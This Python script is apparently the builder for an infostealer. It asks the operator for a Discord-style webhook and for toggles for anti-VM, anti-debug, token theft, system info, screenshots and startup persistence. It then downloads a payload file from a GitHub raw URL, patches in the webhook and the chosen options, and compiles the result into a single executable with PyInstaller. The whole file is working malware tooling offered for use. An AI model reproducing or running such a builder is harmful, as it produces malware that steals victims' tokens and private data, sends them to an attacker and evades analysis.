import subprocess
import colorama
from colorama import Fore
import os
import shutil
import pyfiglet
import requests
from pystyle import Center

colorama.init(autoreset=True)
os.system("cls" if os.name == "nt" else "clear")

target_file = "src/asset/main.py"
download_url = "https://raw.githubusercontent.com/zakocord/Astryrean/refs/heads/main/build/Component/main.py"

class Debug:
    ANSI_COLORS = {
        "black": "\033[30m", "red": "\033[31m", "green": "\033[32m",
        "yellow": "\033[33m", "blue": "\033[34m", "magenta": "\033[35m",
        "cyan": "\033[36m", "white": "\033[37m", "bright_black": "\033[90m",
        "bright_red": "\033[91m", "bright_green": "\033[92m", "bright_yellow": "\033[93m",
        "bright_blue": "\033[94m", "bright_magenta": "\033[95m", "bright_cyan": "\033[96m",
        "bright_white": "\033[97m", "reset": "\033[0m",
    }

    def input(self, name: str, prefix: str = "?", default: str = "", color: str = "white") -> str:
        color_code = self.ANSI_COLORS.get(color.lower(), self.ANSI_COLORS["white"])
        prompt = f"{self.ANSI_COLORS['reset']}{self.ANSI_COLORS['bright_blue']}{prefix}{self.ANSI_COLORS['reset']} {name}{self.ANSI_COLORS['reset']}{color_code} "
        value = input(prompt)
        return value if value.strip() else default

    def log(self, logs: str, color: str = "white") -> None:
        color_code = self.ANSI_COLORS.get(color, self.ANSI_COLORS["white"])
        print(f"{color_code}{logs}{self.ANSI_COLORS['reset']}")

console = Debug()

def download_file(url, destination):
    try:
        console.log(f"[INFO] Not found: {target_file} Download ", "bright_yellow")
        response = requests.get(url)
        response.raise_for_status()
        os.makedirs(os.path.dirname(destination), exist_ok=True)
        with open(destination, "wb") as f:
            f.write(response.content)
        console.log("[+] Succesfully Downloaded Files", "bright_green")
    except Exception as e:
        console.log(f"[-] Download Faild: {e}", "bright_red")

def get_user_input():
    h00k = console.input("Enter Your Webhook:", prefix="!", color="bright_red")
    while not h00k.startswith("https://"):
        console.log("Webhook must start with https://", color="bright_yellow")
        h00k = console.input("Enter Your Webhook:", prefix="?", color="bright_red")

    options = {}
    for key in ["anti_vm", "anti_debug", "token", "systeminfo", "screenshot", "startup"]:
        val = console.input(f"Enable {key.replace('_', ' ').title()}? (y/n):", prefix="*", color="bright_red")
        options[key] = val.lower() == 'y'

    return {
        "h00k": h00k,
        **options
    }

def update_main_py(settings):
    if not os.path.exists(target_file):
        download_file(download_url, target_file)

    try:
        with open(target_file, "r", encoding="utf-8") as f:
            lines = f.readlines()

        feature_start = None
        feature_end = None
        inside_feature = False

        for idx, line in enumerate(lines):
            if "feature = {" in line:
                feature_start = idx
                inside_feature = True
            elif inside_feature and "}" in line:
                feature_end = idx
                break

        if feature_start is not None and feature_end is not None:
            feature_block = '    feature = {\n'
            for key in ["anti_vm", "anti_debug", "token", "systeminfo", "screenshot", "startup"]:
                feature_block += f'        "{key}": {str(settings[key]).capitalize()},\n'  
            feature_block += '    }\n'

            lines = lines[:feature_start] + [feature_block] + lines[feature_end+1:]

        for i, line in enumerate(lines):
            if line.strip().startswith("h00k ="):
                lines[i] = f'h00k = "{settings["h00k"]}"\n'  

        with open(target_file, "w", encoding="utf-8") as f:
            f.writelines(lines)

        console.log("[+] successfully replaced main.py", color="bright_green")
    except Exception as e:
        console.log(f"[-] Failed to update main.py: {e}", color="bright_red")

def install_pyinstaller():
    console.log("[*] Installing PyInstaller...", color="bright_cyan")
    try:
        subprocess.run(["pip", "install", "pyinstaller"], check=True, text=True)
        console.log("[+] PyInstaller installed.", color="bright_green")
    except Exception as e:
        console.log(f"[+] PyInstaller install failed: {e}", color="bright_red")

def build_exe():
    console.log("[*] Starting build process...", color="bright_magenta")
    try:
        subprocess.run(["pyinstaller", "--onefile", target_file], check=True)
        console.log("[+] Executable built successfully.", color="bright_green")
    except Exception as e:
        console.log(f"[+] Failed to build executable: {e}", color="bright_red")

def main():
    settings = get_user_input()
    update_main_py(settings)
    install_pyinstaller()
    build_exe()

if __name__ == "__main__":
    main()
